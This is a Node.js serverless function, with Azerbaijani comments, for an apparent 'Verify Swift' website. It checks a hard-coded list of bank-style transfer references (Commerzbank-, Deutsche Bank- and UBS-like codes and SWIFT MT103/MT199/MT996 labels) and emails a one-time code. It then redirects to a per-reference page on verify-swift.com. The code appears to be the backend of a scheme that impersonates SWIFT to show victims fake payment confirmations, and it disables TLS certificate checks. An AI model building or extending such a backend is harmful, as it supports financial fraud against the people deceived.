const nodemailer = require('nodemailer');

// 1. Bütün referansları və yönləndirmə linklərini bura yerləşdirdik
const refMap = {
    'COBA300525CH59279': 'https://verify-swift.com/verification-cob.html',
    'COBA310625CH68412': 'https://verify-swift.com/verification-cob-abnab',
    'COBA011125CH77290': 'https://verify-swift.com/verification-code-abnaz.html',
    'COBA011125CH86478': 'https://verify-swift.com/verification-abnzdf',
    'COBA780533CH12564': 'https://verify-swift.com/verification-cob-aznasdf',
    'RZBA780533WW25874': 'https://verify-swift.com/verification-cob-xbnetzr',
    'COBA780533CH25879': 'https://verify-swift.com/verification-cob-nzb198adm',
    'COBA310625CH665478': 'https://verify-swift.com/verification-cob-sdf6589db23',
    'COBA515626CH63378': 'https://verify-swift.com/verification-cob-pdg32541ab25',
    'CBA17112248B401-130226': 'https://verify-swift.com/verification-cob-utg566290vcd77',
    'DEU17112212C456-170326': 'https://verify-swift.com/verification-cob-sam54df677',
    'CBA17112248B401-160226': 'https://verify-swift.com/verification-cob-bm65tb7654xz',
    'DEU349827091C679-230326': 'https://verify-swift.com/verification-cob-cju228ac749nb',
    'CBA17112248B401-230226': 'https://verify-swift.com/verfication-cob-an653cbt789g',
    'RCAS29016976S': 'https://verify-swift.com/check/verify/verifymt199/index.html',
    'DEU549325112B147-270326': 'https://verify-swift.com/verification-cob-ds145av41sa17n',
    '2026-03-30-2020A76': 'https://verify-swift.com/check/verify/verifymt199/mt996as7821vba921',
    'EXIMDJACK23032026': 'https://verify-swift.com/check/verify/verifymt199/gh667ai88b09',
    'EXIMDJACK14042026': 'https://verify-swift.com/check/verify/verifymt199/mt552jh770bvc.html',
    'REL-TX-20260424-00': 'https://verify-swift.com/check/verify/verifymt199/dh33487a-bs-006',
    'EXIM/DJ/FIN/28042026-882': 'https://verify-swift.com/check/verify/verifymt199/mt996-as-99902bnd1',
    'UBS21618/234U/MT996': 'https://verify-swift.com/check/verify/verifymt199/ub6689-0-nm211',
    'DEU17112212C332-280426': 'https://verify-swift.com/verification-mt103-bcl5596mb21as21',
    'MMGEU050526ERSTE100M': 'https://verify-swift.com/verification-mt103-bcl01478yt58xd88',
    'DEU17112212C332-230326': 'https://verify-swift.com/verfication-cob-by653atm688v'
};

// 2. Keçici yaddaş (Serverless olduğu üçün yaddaş sıfırlana bilər, lakin qısa sınaqlar üçün işləyir)
let verificationStore = {}; 

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const body = JSON.parse(event.body);
        const { action, ref, email, code } = body;

        // --- A. REFERANS YOXLAMA ---
        if (action === "checkRef") {
            if (refMap[ref]) {
                return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
            }
            return { statusCode: 400, headers, body: JSON.stringify({ success: false, message: "Invalid Reference" }) };
        }

        // --- B. KOD YARATMA VƏ EMAİL GÖNDƏRMƏ ---
        if (action === "sendEmail") {
            const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // Kodu email-ə bağlayırıq və yadda saxlayırıq
            verificationStore[email] = { code: generatedCode, ref: ref, expires: Date.now() + 600000 };

            const transporter = nodemailer.createTransport({
                host: "sh003.megahost.kz",
                port: 465,
                secure: true,
                auth: {
                    user: process.env.SMTP_USER,
                    pass: process.env.SMTP_PASS
                },
                tls: { rejectUnauthorized: false }
            });

            await transporter.sendMail({
                from: `"Verify Swift" <${process.env.SMTP_USER}>`,
                to: email,
                subject: "Your Verification Code - Verify Swift",
                html: `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                        <h2 style="color: #006b3c;">Verify Swift</h2>
                        <p>Your identity verification code is:</p>
                        <div style="font-size: 32px; font-weight: bold; color: #2c3e50; letter-spacing: 5px; margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; text-align: center; border: 1px solid #006b3c;">
                            ${generatedCode}
                        </div>
                        <p>This code will expire in 10 minutes.</p>
                        <p style="font-size: 12px; color: #666;">This is an automated security message for reference: ${ref}</p>
                    </div>
                `
            });

            return { statusCode: 200, headers, body: JSON.stringify({ success: true }) };
        }

        // --- C. KODU TƏSDİQLƏMƏ VƏ LİNKİ GÖNDƏRMƏ ---
        if (action === "verifyFinal") {
            const record = verificationStore[email];
            
            if (record && record.code === code && Date.now() < record.expires) {
                const finalUrl = refMap[record.ref];
                // Təsdiqdən sonra yaddaşdan silirik
                delete verificationStore[email];
                
                return { 
                    statusCode: 200, 
                    headers, 
                    body: JSON.stringify({ success: true, redirect: finalUrl }) 
                };
            }
            
            return { 
                statusCode: 400, 
                headers, 
                body: JSON.stringify({ success: false, message: "Invalid or expired code" }) 
            };
        }

    } catch (error) {
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ success: false, message: error.message })
        };
    }
};
